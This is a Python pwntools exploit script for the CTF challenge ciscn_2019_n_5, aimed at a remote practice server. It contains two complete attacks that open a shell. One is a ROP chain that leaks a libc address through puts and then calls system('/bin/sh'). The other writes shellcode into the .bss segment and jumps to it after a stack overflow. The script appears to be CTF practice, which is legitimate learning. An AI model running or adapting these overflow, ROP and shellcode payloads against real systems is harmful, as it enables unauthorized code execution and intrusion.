from pwn import *
from LibcSearcher import *
context(arch='amd64',os='linux')

# the program disabled NX, 
# and there is a read could get inputs to bss segement,
# so we can get shell by shellcode easliy
# also we could make rop attack to get shell locally

# p = process('./ciscn_2019_n_5')
p = remote('node3.buuoj.cn',26080)

def roplist(p):
	elf = ELF('./ciscn_2019_n_5',checksec=False)

	puts_plt = elf.sym['puts']
	read_got = elf.got['read']
	main = elf.sym['main']

	pop_rdi = 0x0000000000400713 # pop rdi ; ret
	ret = 0x00000000004004c9 # ret
	binsh_bss = 0x601080

	p.recvuntil("tell me your name\n")
	p.send('123')

	p.recvuntil("What do you want to say to me?\n")

	payload = 'A'*(0x20+8)
	payload += flat([ret, pop_rdi, read_got, puts_plt, main])
	p.sendline(payload)
	read_addr = u64(p.recv(7).ljust(8,'\x00'))
	log.success('read_addr = %#x',read_addr)

	libc = LibcSearcher('read',read_addr)
	libc_base = read_addr - libc.dump('read')
	system_addr = libc_base + libc.dump('system')
	binsh = libc_base + libc.dump('str_bin_sh')
	log.info('system_addr = %#x, binsh = %#x'%(system_addr,binsh))

	p.recvuntil("tell me your name\n")
	p.send('/bin/sh\x00')

	p.recvuntil("What do you want to say to me?\n")
	payload = 'A'*(0x20+8)
	# payload += flat([ret, pop_rdi, binsh, system_addr, main])
	payload += flat([ret, pop_rdi, binsh_bss, system_addr, main])
	p.send(payload)
	sleep(1)
	p.interactive()

def Shellcode(p):
	ret = 0x00000000004004c9 # ret
	shellcode_bss = 0x601080
	p.recvuntil("tell me your name")
	p.send(asm(shellcraft.sh()))
	p.recvuntil("What do you want to say to me?")

	# payload = 'A'*(0x20+8) + p64(shellcode_bss)
	payload = 'A'*0x28 + p64(ret) + p64(shellcode_bss)
	p.sendline(payload)
	sleep(1)
	p.interactive()

# roplist(p)
# roplist could get shell locally
Shellcode(p)
# Sehllcode could get shell both server and locally

